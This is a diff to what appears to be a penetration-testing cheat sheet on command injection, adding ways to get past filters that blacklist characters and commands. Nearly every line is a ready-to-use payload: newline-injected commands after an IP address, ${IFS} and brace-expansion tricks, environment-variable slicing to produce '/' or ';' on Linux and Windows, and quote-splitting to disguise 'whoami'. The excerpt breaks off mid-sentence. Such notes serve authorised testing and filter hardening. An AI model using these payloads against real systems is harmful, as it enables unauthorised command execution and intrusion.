@@ -12,4 +12,10 @@
 - Use Tabs - `127.0.0.1%0a%09`
 - Use IFS - `127.0.0.1%0a${IFS}`
 - Using Brace Expansions - `127.0.0.1%0a{ls,-la}`
-- If `/` is blacklisted then we can use 
+- `LINUX` If `/` is blacklisted then we can use something like - `${PATH:0:1}`, this prints the same output
+-  `LINUX` If `;` is blacklisted then we can use something like - `${LS_COLORS:10:1}`
+- `WINDOWS` If `/` is blacklisted then we can use something like - `echo %HOMEPATH:~6,-11%`
+
+## Bypassing Blacklisted Commands
+- If a command like `whoami` is blacklisted, then for `BASH` or `POWERSHELL` we can use - `w'h'o'am'i`
+- If a command like `whoami` is blacklisted and it's confirmed that is ``
